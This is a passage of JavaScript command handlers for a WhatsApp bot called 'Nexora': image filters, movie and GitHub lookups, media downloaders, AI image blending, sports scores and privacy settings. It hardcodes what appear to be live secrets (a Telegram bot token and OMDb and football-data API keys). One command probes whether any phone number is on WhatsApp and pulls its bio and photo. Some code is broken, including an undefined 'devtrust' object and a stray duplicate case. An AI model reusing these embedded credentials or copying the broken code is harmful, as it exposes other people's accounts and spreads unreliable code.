    ];

    try {
        await empire.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });

        if (avatarOnlyFilters.includes(subCommand)) {
            const avatar = await getAvatarUrlMatrix();
            const folder = ['comrade', 'gay', 'glass', 'jail', 'passed', 'triggered'].includes(subCommand) ? 'overlay' : 'canvas/misc';
            const targetUrl = folder === 'overlay' 
                ? `https://api.some-random-api.com/canvas/overlay/${subCommand}?avatar=${encodeURIComponent(avatar)}`
                : `https://api.some-random-api.com/canvas/misc/${subCommand}?avatar=${encodeURIComponent(avatar)}`;

            const response = await axios.get(targetUrl, { responseType: 'arraybuffer', timeout: 20000 });
            return await empire.sendMessage(m.chat, { image: Buffer.from(response.data) }, { quoted: m });
        }

        switch (subCommand) {
            case 'its-so-stupid': {
                const dogText = remainingArgs.join(' ').trim();
                if (!dogText) return reply(`❌ *Usage:* ${prefix + command} its-so-stupid <text content>`);
                
                const avatar = await getAvatarUrlMatrix();
                const response = await axios.get(`https://api.some-random-api.com/canvas/misc/its-so-stupid?dog=${encodeURIComponent(dogText)}&avatar=${encodeURIComponent(avatar)}`, { responseType: 'arraybuffer' });
                await empire.sendMessage(m.chat, { image: Buffer.from(response.data) }, { quoted: m });
                break;
            }

            case 'namecard': {
                const parts = remainingArgs.join(' ').split('|').map(s => s.trim());
                const [username, birthday, description] = parts;
                if (!username || !birthday) return reply(`❌ *Usage:* ${prefix + command} namecard username|birthday|description(optional)`);

                const avatar = await getAvatarUrlMatrix();
                const params = new URLSearchParams({ username, birthday, avatar });
                if (description) params.append('description', description);

                const response = await axios.get(`https://api.some-random-api.com/canvas/misc/namecard?${params.toString()}`, { responseType: 'arraybuffer' });
                await empire.sendMessage(m.chat, { image: Buffer.from(response.data) }, { quoted: m });
                break;
            }

            case 'oogway':
            case 'oogway2': {
                const quoteText = remainingArgs.join(' ').trim();
                if (!quoteText) return reply(`❌ *Usage:* ${prefix + command} ${subCommand} <quote text>`);

                const avatar = await getAvatarUrlMatrix();
                const response = await axios.get(`https://api.some-random-api.com/canvas/misc/${subCommand}?quote=${encodeURIComponent(quoteText)}&avatar=${encodeURIComponent(avatar)}`, { responseType: 'arraybuffer' });
                await empire.sendMessage(m.chat, { image: Buffer.from(response.data) }, { quoted: m });
                break;
            }

            case 'tweet': {
                const parts = remainingArgs.join(' ').split('|').map(s => s.trim());
                const [displayname, username, comment, theme] = parts;
                if (!displayname || !username || !comment) return reply(`❌ *Usage:* ${prefix + command} tweet displayname|username|comment|theme(light/dark)`);

                const avatar = await getAvatarUrlMatrix();
                const params = new URLSearchParams({ displayname, username, comment, avatar });
                if (theme) params.append('theme', theme);

                const response = await axios.get(`https://api.some-random-api.com/canvas/misc/tweet?${params.toString()}`, { responseType: 'arraybuffer' });
                await empire.sendMessage(m.chat, { image: Buffer.from(response.data) }, { quoted: m });
                break;
            }

            case 'youtube-comment': {
                const parts = remainingArgs.join(' ').split('|').map(s => s.trim());
                const [username, comment] = parts;
                if (!username || !comment) return reply(`❌ *Usage:* ${prefix + command} youtube-comment username|comment`);

                const avatar = await getAvatarUrlMatrix();
                const params = new URLSearchParams({ username, comment, avatar });

                const response = await axios.get(`https://api.some-random-api.com/canvas/misc/youtube-comment?${params.toString()}`, { responseType: 'arraybuffer' });
                await empire.sendMessage(m.chat, { image: Buffer.from(response.data) }, { quoted: m });
                break;
            }

            default:
                reply(`❌ Unknown sub-command parameter. Type \`${prefix + command}\` to view all available filters.`);
                break;
        }

    } catch (err) {
        console.error(err);
        reply('❌ Image generation engine encountered an upstream API timeout. Try again shortly.');
    }
}
break;
case 'imdb': {
//case 'movie': {
  if (!isCreator) return;
    const query = args.join(' ');
    if (!query) return reply(`❌ Please specify a movie or series title.\nExample: \`.imdb The Walking Dead\``);

    await empire.sendMessage(m.chat, { react: { text: '🎬', key: m.key } });
    const axios = require('axios');

    try {
        // Querying a free, keyless open IMDb search proxy
        const res = await axios.get(`https://www.omdbapi.com/?t=${encodeURIComponent(query)}&apikey=632d431d`);
        const data = res.data;

        if (data.Response === 'False') return reply(`❌ Movie or Series title not found.`);

        const entertainmentCard = `
🎬 *𝙸𝙼𝙳𝚋 𝙴𝙽𝚃𝙴𝚁𝚃𝙰𝙸𝙽𝙼𝙴𝙽𝚃 𝙸𝙽𝚂𝙿𝙴𝙲𝚃𝙾𝚁*

• *Title:* ${data.Title}
• *Year Released:* ${data.Year}
• *Age Rating:* \`${data.Rated}\`
• *Runtime:* ${data.Runtime}

🌟 *CRITIC EVALUATIONS*
• *IMDb Score Rating:* ⭐ \`${data.imdbRating} / 10\`
• *Total MetaScore:* 📊 \`${data.Metascore} / 100\`
• *Box Office:* ${data.BoxOffice || 'N/A'}

🎭 *CREATIVE CAST & GENRE*
• *Genre Type:* ${data.Genre}
• *Main Directors:* ${data.Director}
• *Lead Cast:* ${data.Actors}

📝 *PLOT SUMMARY CORRIDOR:*
_"${data.Plot}"_
`.trim();

        // Deliver poster asset alongside complete data card mapping
        if (data.Poster && data.Poster !== 'N/A') {
            await empire.sendMessage(m.chat, { 
                image: { url: data.Poster }, 
                caption: entertainmentCard 
            }, { quoted: m });
        } else {
            reply(entertainmentCard);
        }

    } catch (e) {
        reply('❌ IMDb core cluster connectivity timeout.');
    }
}
break;

case 'stalkgithub':
case 'github': {
  if (!isCreator) return;
    const username = args[0];
    if (!username) return reply(`❌ Please specify a GitHub username.\nExample: \`.stalkgithub sir-demon\``);

    await empire.sendMessage(m.chat, { react: { text: '🖥️', key: m.key } });
    const axios = require('axios');

    try {
        const res = await axios.get(`https://api.github.com/users/${encodeURIComponent(username)}`);
        const data = res.data;

        // Clean up date strings into a readable calendar format
        const createdDate = new Date(data.created_at).toLocaleDateString('en-US', {
            year: 'numeric', month: 'long', day: 'numeric'
        });

        const githubProfileCard = `
🖥️ *𝙶𝙸𝚃𝙷𝚄𝙱 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𝙳𝙾𝚂𝚂𝙸𝙴𝚁*

• *Name:* ${data.name || 'Not Specified'}
• *Username:* ${data.login}
• *Bio:* _${data.bio || 'No bio written.'}_
• *Location:* ${data.location || 'Unknown'}

📊 *REPOSITORY & NETWORK METRICS*
• *Public Repositories:* \`${data.public_repos}\`
• *Public Gists:* \`${data.public_gists}\`
• *Followers:* \`${data.followers}\`
• *Following:* \`${data.following}\`

🔗 *METADATA LINKS*
• *Profile URL:* https://github.com/${data.login}
• *Blog/Portfolio:* ${data.blog || 'None'}
• *Account Created On:* ${createdDate}
`.trim();

        // Send the complete dashboard along with their avatar image
        await empire.sendMessage(m.chat, { 
            image: { url: data.avatar_url }, 
            caption: githubProfileCard 
        }, { quoted: m });

    } catch (err) {
        if (err.response && err.response.status === 404) {
            reply('❌ The specified GitHub username could not be found in the database registries.');
        } else {
            reply('❌ System failure reading parameters from the GitHub API engine.');
        }
    }
}
break;

// =========================================================================
// 2. TEXT TO SPEECH (TTS) COMMAND
// =========================================================================
case 'tts':
case 'google-tts': {
    const gTTS = require('gtts');
    const fs = require('fs');
    const path = require('path');

    const ttsText = args.join(' ');
    if (!ttsText) return reply(`❌ Please provide the text content for vocalization.\nExample: *${prefix + command} Hello World*`);

    await empire.sendMessage(m.chat, { react: { text: '🗣️', key: m.key } });

    const fileName = `tts-${Date.now()}.mp3`;
    const filePath = path.join(__dirname, '..', 'assets', fileName);
    
    // Ensure assets folder exists safely
    if (!fs.existsSync(path.dirname(filePath))) {
        fs.mkdirSync(path.dirname(filePath), { recursive: true });
    }

    const gtts = new gTTS(ttsText, 'en'); // Defaults to English
    gtts.save(filePath, async function (err) {
        if (err) {
            console.error(err);
            return reply('❌ Error compiling your string sequence into audio streams.');
        }

        await empire.sendMessage(m.chat, {
            audio: { url: filePath },
            mimetype: 'audio/mpeg',
            ptt: false
        }, { quoted: m });

        try { fs.unlinkSync(filePath); } catch {}
    });
}
break;


case 'fb':
case 'facebook': {
    const axios = require('axios');
    const fs = require('fs');
    const path = require('path');

    const fbUrl = args[0]?.trim();
    if (!fbUrl) return reply(`❌ Please specify a valid Facebook Video URL Link.\nExample: *${prefix + command} https://www.facebook.com/...*`);
    if (!fbUrl.includes('facebook.com') && !fbUrl.includes('fb.watch')) return reply("❌ That is not a valid Facebook endpoint asset sequence.");

    await empire.sendMessage(m.chat, { react: { text: '🔄', key: m.key } });

    let resolvedUrl = fbUrl;
    try {
        const res = await axios.get(fbUrl, { timeout: 15000, maxRedirects: 10, headers: { 'User-Agent': 'Mozilla/5.0' } });
        if (res?.request?.res?.responseUrl) resolvedUrl = res.request.res.responseUrl;
    } catch {}

    try {
        const apiUrl = `https://api.hanggts.xyz/download/facebook?url=${encodeURIComponent(resolvedUrl)}`;
        const response = await axios.get(apiUrl, {
            timeout: 25000,
            headers: { 'User-Agent': 'Mozilla/5.0' }
        });

        const data = response.data;
        let fbvid = null;
        let title = "Facebook Video";

        if (data) {
            if (data.result) {
                if (data.result.media) {
                    fbvid = data.result.media.video_hd || data.result.media.video_sd;
                    title = data.result.info?.title || data.result.title || title;
                } else if (typeof data.result === 'object' && data.result.url) {
                    fbvid = data.result.url;
                    title = data.result.title || title;
                } else if (typeof data.result === 'string') {
                    fbvid = data.result;
                }
            } else if (data.data) {
                if (typeof data.data === 'object' && data.data.url) {
                    fbvid = data.data.url;
                } else if (Array.isArray(data.data) && data.data.length > 0) {
                    fbvid = data.data[0]?.url;
                }
            } else if (data.url) {
                fbvid = data.url;
            }
        }

        if (!fbvid) return reply('❌ Video conversion error: Content might be private, deleted, or blocked by API thresholds.');

        const captionText = `📥 *NEXORA FB DOWNLOADER*\n\n📝 *Title:* ${title}`;

        try {
            // Method 1: Send via Direct URL Link (Fastest, zero disc usage)
            await empire.sendMessage(m.chat, {
                video: { url: fbvid },
                mimetype: "video/mp4",
                caption: captionText
            }, { quoted: m });
        } catch {
            // Method 2: Fallback memory buffering compilation if URL stream drops
            const tmpDir = path.join(process.cwd(), 'tmp');
            if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
            const tempFile = path.join(tmpDir, `fb_${Date.now()}.mp4`);

            const videoResponse = await axios({ method: 'GET', url: fbvid, responseType: 'stream', timeout: 45000 });
            const writer = fs.createWriteStream(tempFile);
            videoResponse.data.pipe(writer);

            await new Promise((resolve, reject) => {
                writer.on('finish', resolve);
                writer.on('error', reject);
            });

            await empire.sendMessage(m.chat, {
                video: { url: tempFile },
                mimetype: "video/mp4",
                caption: captionText
            }, { quoted: m });

            try { fs.unlinkSync(tempFile); } catch {}
        }

        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error(e);
        reply(`❌ Facebook Downloader Engine error: ${e.message}`);
    }
}
break;

// =========================================================================
// 5. BLUR IMAGE COMMAND (Uses Sharp Core to apply Gaussian Blur)
// =========================================================================


// =========================================================================
// 6. DAD JOKE GENERATOR COMMAND
// =========================================================================




case 'roseday': {
    if (!isCreator) return;
    try {
        const fetch = require('node-fetch');
        const res = await fetch(`https://api.princetechn.com/api/fun/roseday?apikey=prince`);
        if (!res.ok) throw new Error('API failed');
        const json = await res.json();
        reply(json.result);
    } catch (error) {
        console.error(error);
        reply('❌ Failed to get roseday quote. Please try again later!');
    }
    break;
}



case 'blur': {
    if (!isCreator) return;
    try {
        const sharp = require('sharp');
        let mediaMessage = m.message?.imageMessage ? m : (m.message?.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage ? { message: { imageMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage } } : null);
        
        if (!mediaMessage) return reply('❌ Please reply to an image or send an image with caption .blur');

        const stream = await downloadContentFromMessage(mediaMessage.message.imageMessage, 'image');
        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        let imageBuffer = Buffer.concat(chunks);

        const blurredImage = await sharp(imageBuffer)
            .resize(800, 800, { fit: 'inside', withoutEnlargement: true })
            .blur(10)
            .jpeg({ quality: 80 })
            .toBuffer();

        await empire.sendMessage(from, {
            image: blurredImage,
            caption: '*[ ✔ ] Image Blurred Successfully*'
        }, { quoted: m });
    } catch (error) {
        console.error(error);
        reply('❌ Failed to blur image.');
    }
    break;
}

case 'joke': {
    if (!isCreator) return;
    try {
        const response = await axios.get('https://icanhazdadjoke.com/', { headers: { Accept: 'application/json' } });
        reply(response.data.joke);
    } catch (error) {
        console.error(error);
        reply('Sorry, I could not fetch a joke right now.');
    }
    break;
}

case 'tg': case 'telegramsticker': {
    if (!isCreator) return;
    if (!text) return reply('⚠️ Please enter the Telegram sticker URL!\n\nExample: .tg https://t.me/addstickers/Porcientoreal');
    if (!text.match(/(https:\/\/t.me\/addstickers\/)/gi)) return reply('❌ Invalid URL! Make sure it\'s a Telegram sticker URL.');

    try {
        const fetch = require('node-fetch');
        const webp = require('node-webpmux');
        const path = require('path');
        const { exec } = require('child_process');

        const packName = text.replace("https://t.me/addstickers/", "").trim();
        const botToken = '7801479976:AAGuPL0a7kXXBYz6XUSR_ll2SR5V_W6oHl4';
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/getStickerSet?name=${encodeURIComponent(packName)}`);
        const stickerSet = await response.json();
        
        if (!stickerSet.ok || !stickerSet.result) return reply('Invalid sticker pack or API response');

        reply(`📦 Found ${stickerSet.result.stickers.length} stickers\n⏳ Starting download processing loop...`);

        const tmpDir = path.join(process.cwd(), 'tmp');
        if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });

        for (let i = 0; i < Math.min(stickerSet.result.stickers.length, 15); i++) { // Process safely up to 15 chunks natively
            try {
                const sticker = stickerSet.result.stickers[i];
                const fileInfo = await fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${sticker.file_id}`);
                const fileData = await fileInfo.json();
                if (!fileData.ok || !fileData.result.file_path) continue;

                const fileUrl = `https://api.telegram.org/file/bot${botToken}/${fileData.result.file_path}`;
                const imgRes = await fetch(fileUrl);
                const imgBuffer = await imgRes.buffer();

                const tempInput = path.join(tmpDir, `tg_in_${Date.now()}_${i}`);
                const tempOutput = path.join(tmpDir, `tg_out_${Date.now()}_${i}.webp`);
                fs.writeFileSync(tempInput, imgBuffer);

                const ffmpegCmd = (sticker.is_animated || sticker.is_video)
                    ? `ffmpeg -i "${tempInput}" -vf "scale=512:512:force_original_aspect_ratio=decrease,fps=15,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000" -c:v libwebp -preset default -loop 0 -pix_fmt yuva420p -quality 75 "${tempOutput}"`
                    : `ffmpeg -i "${tempInput}" -vf "scale=512:512:force_original_aspect_ratio=decrease,format=rgba,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000" -c:v libwebp -preset default -pix_fmt yuva420p -quality 75 "${tempOutput}"`;

                await new Promise((res, rej) => exec(ffmpegCmd, (e) => e ? rej(e) : res()));

                const webpBuffer = fs.readFileSync(tempOutput);
                const img = new webp.Image();
                await img.load(webpBuffer);

                const exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00]);
                const jsonBuffer = Buffer.from(JSON.stringify({'sticker-pack-id': crypto.randomBytes(32).toString('hex'), 'sticker-pack-name': 'Nexora Pack'}), 'utf8');
                const exif = Buffer.concat([exifAttr, jsonBuffer]);
                exif.writeUIntLE(jsonBuffer.length, 14, 4);
                img.exif = exif;

                const finalBuffer = await img.save(null);
                await empire.sendMessage(from, { sticker: finalBuffer });

                try { fs.unlinkSync(tempInput); fs.unlinkSync(tempOutput); } catch {}
                await sleep(800);
            } catch (err) { console.error(err); }
        }
        reply("✅ Pack sync loop complete!");
    } catch (error) {
        console.error(error);
        reply('❌ Failed to process Telegram stickers.');
    }
    break;
}


            case 'tweet2': {
            if (!isCreator) return;
                const joined = rest.join(' ');
                const [displayname, username, comment, theme] = joined.split('|').map(s => (s || '').trim());
                if (!displayname || !username || !comment) return reply(`⚠️ Layout missing!\nUsage: ${prefix}misc tweet Display Name|username|comment|light or dark`);
                let params = `displayname=${encodeURIComponent(displayname)}&username=${encodeURIComponent(username)}&comment=${encodeURIComponent(comment)}`;
                if (theme) params += `&theme=${encodeURIComponent(theme)}`;
                await sendCanvasEndpoint('misc/tweet', params);
                break;
            }

            case 'youtube-comment': {
                const joined = rest.join(' ');
                const [username, comment] = joined.split('|').map(s => (s || '').trim());
                if (!username || !comment) return reply(`⚠️ Usage: ${prefix}misc youtube-comment Username|Your Comment`);
                await sendCanvasEndpoint('misc/youtube-comment', `username=${encodeURIComponent(username)}&comment=${encodeURIComponent(comment)}`);
                break;
            }

            // --- OVERLAY PATH ENDPOINTS (FIXED ROUTE FROM MISC -> OVERLAY) ---
            



case 'nanobanana': {
    const jid = from;
    const userId = m.sender;
    const input = text.trim();

    if (!bananaSession[userId]) bananaSession[userId] = { images: [] };
    const session = bananaSession[userId];

    async function uploadMedia(m) {
        try {
            const q = m.quoted ? m.quoted : m;
            const mime = q.mimetype || q.msg?.mimetype || '';
            if (!/image|sticker/.test(mime)) return null;

            const media = await q.download();
            const form = new FormData();
            form.append('file', media, { filename: 'image.jpg' });
            form.append('type', 'permanent');

            const res = await axios.post('https://tmp.malvryx.dev/upload', form, {
                headers: form.getHeaders()
            });

            return res.data?.cdnUrl || res.data?.directUrl || null;
        } catch {
            return null;
        }
    }

    async function pollResult(taskId) {
        for (let i = 0; i < 25; i++) {
            await sleep(5000);
            const { data } = await axios.get(
                `https://omegatech-api.dixonomega.tech/api/ai/nano-banana2-result?task_id=${taskId}`
            );

            if (data.status === 'completed') return data.image_url;
            if (data.status === 'failed') throw new Error('Blend failed.');
        }
        throw new Error('Timeout.');
    }

    // ── DONE & BLEND ──
    if (input.toLowerCase().startsWith('done')) {
        const finalPrompt = input.replace(/^done/i, '').trim();

        if (session.images.length < 2) {
            return reply(`⚠️ *Need at least 2 images*\nCurrently: ${session.images.length}/4`);
        }

        if (!finalPrompt) {
            return reply(`⚠️ *Use:* ${prefix}nanopro done <prompt>\nExample: ${prefix}nanopro done blend them together`);
        }

        await empire.sendMessage(jid, { react: { text: '🕒', key: m.key } });
        
        try {
            let url = `https://omegatech-api.dixonomega.tech/api/ai/nanobana-pro-v3?prompt=${encodeURIComponent(finalPrompt)}`;

            session.images.forEach((img, i) => {
                url += `&image${i + 1}=${encodeURIComponent(img)}`;
            });

            const { data } = await axios.get(url);

            if (!data?.task_id) throw new Error('No task ID.');

            reply(`🎨 *Blending ${session.images.length} images...*\n⏳ Please wait`);

            const result = await pollResult(data.task_id);

            await empire.sendMessage(jid, {
                image: { url: result },
                caption:
`╭━━━〔 🍌 *NANO PRO BLEND* 〕━━━⬣
┃ 🖼️ *Images:* ${session.images.length}
┃ 📝 *Prompt:* ${finalPrompt}
┃ 🌌 *Bot:* Nexora Md
╰━━━━━━━━━━━━━━⬣`
            }, { quoted: m });

            await empire.sendMessage(jid, { react: { text: '✅', key: m.key } });
        } catch (e) {
            console.error('[Nano Pro Error]', e);
            await devtrust.sendMessage(jid, { react: { text: '❌', key: m.key } });
            reply(`❌ *Blend failed*\n${e.message}`);
        } finally {
            delete bananaSession[userId];
        }
        break;
    }

    // ── COLLECT IMAGES ──
    const link = await uploadMedia(m);

    if (!link) {
        return reply(
`📸 *Send image with ${prefix}nanopro*

Current: ${session.images.length}/4

When done: ${prefix}nanopro done <prompt>`
        );
    }

    if (session.images.length >= 4) {
        return reply(`❌ *Max 4 images reached*\nUse: ${prefix}nanopro done <prompt>`);
    }

    session.images.push(link);

    await empire.sendMessage(jid, { react: { text: '📥', key: m.key } });
    reply(
`✅ *Image added!* (${session.images.length}/4)

${session.images.length === 1 ? '📸 Send another image' : session.images.length < 4 ? `📸 ${4 - session.images.length} more needed` : '🎨 Ready! Use: *' + prefix + 'nanopro done <prompt>*'}`
    );
}
break;

case 'inspectnum':
case 'num': {
    if (!text) return reply("📱 Provide a number with country code!\nExample: .num 23480xxxxxxxx");
    await empire.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });

    try {
        let cleanNum = text.replace(/[^0-9]/g, '');
        let jid = cleanNum + '@s.whatsapp.net';
        let [res] = await empire.onWhatsApp(jid);

        if (res && res.exists) {
            // --- 🟢 REGISTERED & ACTIVE ---
            let info = await empire.fetchStatus(jid).catch(() => ({ status: "Hidden/No Bio" }));
            let pp = await empire.profilePictureUrl(jid, 'image').catch(() => 'https://i.imgur.com/89S9pXp.png');

            let msg = `📱 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗡𝗨𝗠𝗕𝗘𝗥 𝗜𝗡𝗦𝗣𝗘𝗖𝗧*\n\n`;
            msg += `📍 *Status:* Active ✅\n`;
            msg += `🆔 *JID:* ${res.jid}\n`;
            msg += `📝 *Bio:* ${info.status}\n\n`;
            msg += `_Number is currently active on WhatsApp._`;

            await empire.sendMessage(m.chat, { image: { url: pp }, caption: msg }, { quoted: m });
        } else {
            // --- 🔴 BANNED OR NOT REGISTERED ---
            // We use your banned image URL here
            let bannedImg = "https://i.ibb.co/Kxgj6LmR/8943d8d00920.jpg"; 
            
            let msg = `🚫 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗜𝗡𝗦𝗣𝗘𝗖𝗧𝗜𝗢𝗡*\n\n`;
            msg += `📍 *Possible Reason:* Banned or Not Registered\n`;
            msg += `🔢 *Number:* +${cleanNum}\n\n`;
            msg += `⚠️ _Note: WhatsApp does not differentiate between a banned account and a non-existent one. If this was an active account recently, it is likely BANNED._`;

            await empire.sendMessage(m.chat, { image: { url: bannedImg }, caption: msg }, { quoted: m });
        }
    } catch (e) {
        console.error(e);
        reply("❌ Error inspecting number.");
    }
}
break;

case 'setlastseen': {
    // Restrict the command to the bot creator using your global variable
    if (!isCreator) return reply('❌ This administrative command is restricted to the bot owner.');

    const targetSetting = args[0]?.toLowerCase();

    if (!targetSetting) {
        return reply(
`🔐 *LAST SEEN PRIVACY CONFIGURATION*

*Usage:* • \`${prefix + command} all\` — Visible to everyone
• \`${prefix + command} contacts\` — Visible to contacts only
• \`${prefix + command} none\` — Hide last seen completely

_Note: If you hide your last seen (none), you won't be able to see other people's last seen either._`
        );
    }

    // Map user-friendly arguments to Baileys technical privacy keys
    const validSettings = ['all', 'contacts', 'none'];
    if (!validSettings.includes(targetSetting)) {
        return reply('❌ Invalid parameter. Please select either: *all*, *contacts*, or *none*.');
    }

    try {
        await empire.sendMessage(m.chat, { react: { text: '⚙️', key: m.key } });

        // Direct Baileys socket execution update handler
        await empire.updateLastSeenPrivacy(targetSetting);

        // Match your online presence setting to follow your last seen rule
        if (targetSetting === 'none') {
            await empire.updateOnlinePrivacy('match_last_seen');
        } else if (targetSetting === 'all') {
            await empire.updateOnlinePrivacy('all');
        }

        reply(`✅ *Success:* Your Last Seen privacy layer has been configured to *"${targetSetting}"*.`);
    } catch (err) {
        console.error('Privacy update module encountered an error:', err);
        reply('❌ Failed to update privacy configuration server-side. Please try again later.');
    }
}
break;

case 'reverse': {
    if (!isCreator) return;
    if (!text) return reply("🔄 Example: .reverse Nexora");

    let rev = text.split('').reverse().join('');
    reply(`🔄 ${rev}`);
}
break;
case 'llamacoder':
case 'llama':
case 'codegen': {
    const axios = require('axios');
    const archiver = require('archiver');
    const { PassThrough } = require('stream');

    // Verify command arguments are present
    if (!args[0]) {
        return reply(`🦙 *LlamaCoder AI*\n\nProvide a description of what you want to build.\n\n*Example:* ${prefix + command} a modern weather dashboard with charts`);
    }

    const promptText = args.join(' ');

    try {
        // Trigger status reaction and initial update
        await empire.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

        // Execute raw API payload transaction
        const { data } = await axios.get(
            `https://omegatech-api.dixonomega.tech/api/ai/llamacoder?action=create&prompt=${encodeURIComponent(promptText)}&quality=low`,
            { timeout: 120000 }
        );

        if (!data?.success) throw data?.error || data?.message || 'API compilation error';

        const files = data.files || [];
        const rawOutput = data.rawOutput || '';

        // If no files were generated, return raw code text chunk cleanly
        if (!files.length) {
            await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
            return await empire.sendMessage(m.chat, {
                text: `💻 *GENERATED CODE OUTPUT*\n\n${rawOutput.slice(0, 4000)}`
            }, { quoted: m });
        }

        // Initialize background archival streaming compression engine
        const zipBuffer = await new Promise((resolve, reject) => {
            const passThrough = new PassThrough();
            const chunks = [];

            passThrough.on('data', chunk => chunks.push(chunk));
            passThrough.on('end', () => resolve(Buffer.concat(chunks)));
            passThrough.on('error', reject);

            const archive = archiver('zip', { zlib: { level: 9 } });
            archive.on('error', reject);
            archive.pipe(passThrough);

            for (const file of files) {
                // Append current iteration data streams directly into structure matrix
                archive.append(file.content || '', { name: file.path || 'index.txt' });
            }

            archive.finalize();
        });

        // Dispatch individual repository file map directory overview
        let manifestText = `📦 *PROJECT COMPILED SUCCESSFUL*\n\n`;
        manifestText += `📝 *Prompt:* ${promptText}\n`;
        manifestText += `📁 *Total Files:* ${files.length}\n\n`;
        manifestText += `*File Manifest:*\n`;
        manifestText += files.map(f => ` ├ 📄 ${f.path}`).join('\n');

        await empire.sendMessage(m.chat, { text: manifestText }, { quoted: m });

        // Dispatch raw project binary zip document
        await empire.sendMessage(m.chat, {
            document: zipBuffer,
            mimetype: 'application/zip',
            fileName: `project-${Date.now()}.zip`
        }, { quoted: m });

        await empire.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        await empire.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        const errMsg = err?.response?.data
            ? JSON.stringify(err.response.data)
            : typeof err === 'string'
            ? err
            : err.message || 'Fatal endpoint transmission failure';
        
        reply(`❌ *LlamaCoder Engine Error:*\n${errMsg}`);
    }
}
break;

case 'fixture':
case 'fixtures':
case 'nextmatch': {
    if (!q) return reply(`Please provide a team name.\nExample: ${prefix + command} Liverpool`);
    
    await empire.sendMessage(m.chat, { react: { text: '📅', key: m.key } });

    try {
        const axios = require('axios');
        
        // Step 1: Search for the Team ID first
        const searchRes = await axios.get(`https://www.thesportsdb.com/api/v1/json/3/searchteams.php?t=${encodeURIComponent(q)}`);
        if (!searchRes.data.teams) return reply("❌ Team not found.");
        
        const teamId = searchRes.data.teams[0].idTeam;
        const teamName = searchRes.data.teams[0].strTeam;
        const teamBadge = searchRes.data.teams[0].strTeamBadge;

        // Step 2: Fetch the next 5 events for that Team ID
        const fixtureRes = await axios.get(`https://www.thesportsdb.com/api/v1/json/3/eventsnext.php?id=${teamId}`);
        const events = fixtureRes.data.events;

        if (!events) return reply(`❌ No upcoming fixtures found for ${teamName}.`);

        let fixtureMsg = `*📅 UPCOMING FIXTURES: ${teamName.toUpperCase()}*\n\n`;

        events.forEach((ev, i) => {
            fixtureMsg += `*${i + 1}. ${ev.strEvent}*\n`;
            fixtureMsg += `🏆 ${ev.strLeague}\n`;
            fixtureMsg += `⏰ ${ev.dateEvent} | ${ev.strTime || 'TBA'}\n`;
            fixtureMsg += `📍 ${ev.strVenue || 'TBA'}\n\n`;
        });

        fixtureMsg += `_Time is usually in GMT/UTC._`;

        await empire.sendMessage(m.chat, {
            image: { url: teamBadge },
            caption: fixtureMsg,
            contextInfo: {
                externalAdReply: {
                    title: `Schedule for ${teamName}`,
                    body: "Nexora Sports Engine",
                    thumbnailUrl: teamBadge,
                    sourceUrl: "https://www.google.com/search?q=" + encodeURIComponent(teamName + " fixtures"),
                    mediaType: 1,
                   renderLargerThumbnail: false
                }
            }
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        reply("⚠️ Failed to fetch fixtures. Please try again.");
    }
}
break;

case 'livescore':
case 'live': {
    if (!isCreator) return;
    await empire.sendMessage(m.chat, { react: { text: '⚽', key: m.key } });

    try {
        const axios = require('axios');
        const res = await axios.get(`https://api.football-data.org/v4/matches`, {
            headers: { 'X-Auth-Token': '5dc3e89431c14629b2c166d5523026e1' }
        });

        const liveMatches = res.data.matches.filter(m => m.status === 'IN_PLAY' || m.status === 'PAUSED');

        if (liveMatches.length === 0) return reply("No matches are currently live.");

        let msg = `🏟️ *FOOTBALL LIVE SCORES*\n\n`;
        liveMatches.forEach(m => {
            msg += `• ${m.homeTeam.shortName} *${m.score.fullTime.home}-${m.score.fullTime.away}* ${m.awayTeam.shortName}\n`;
        });
        reply(msg);
    } catch (e) {
        reply("❌ API limit reached or error fetching live scores.");
    }
}
break;

case 'table2':
case 'standing2':
case 'standings2': {
    await empire.sendMessage(m.chat, { react: { text: '📊', key: m.key } });

    try {
        const axios = require('axios');
        // Fetching from the David Cyril Standings API
        const res = await axios.get(`https://apis.davidcyril.name.ng/sports/soccer/standings?league=eng.1`);
        
        if (!res.data || !res.data.status || !res.data.result) {
            return reply("❌ Failed to fetch standings. The database might be updating.");
        }

        const standings = res.data.result;
        let tableMsg = `*── 「 PREMIER LEAGUE TABLE 」 ──*\n\n`;
        tableMsg += `\`\`\`POS | TEAM       | P | PTS\`\`\`\n`;
        tableMsg += `\`\`\`━━━━━━━━━━━━━━━━━━━━━━\`\`\`\n`;

        // Loop through the top 20 teams
        standings.forEach((t) => {
            // Trim team name to 10 characters to keep the table aligned
            let teamName = t.name.length > 10 ? t.name.substring(0, 10) + '.' : t.name.padEnd(10, ' ');
            let rank = t.rank.toString().padStart(2, ' ');
            let played = t.played.toString().padStart(2, ' ');
            let points = t.points.toString().padStart(2, ' ');

            tableMsg += `\`\`\`${rank}. | ${teamName} | ${played}| ${points}\`\`\`\n`;
        });

        tableMsg += `\n_Nexora Sports Engine: Live Standings_`;

        await empire.sendMessage(m.chat, {
            text: tableMsg,
            contextInfo: {
                externalAdReply: {
                    title: "OFFICIAL EPL STANDINGS",
                    body: "2025/2026 Season Feed",
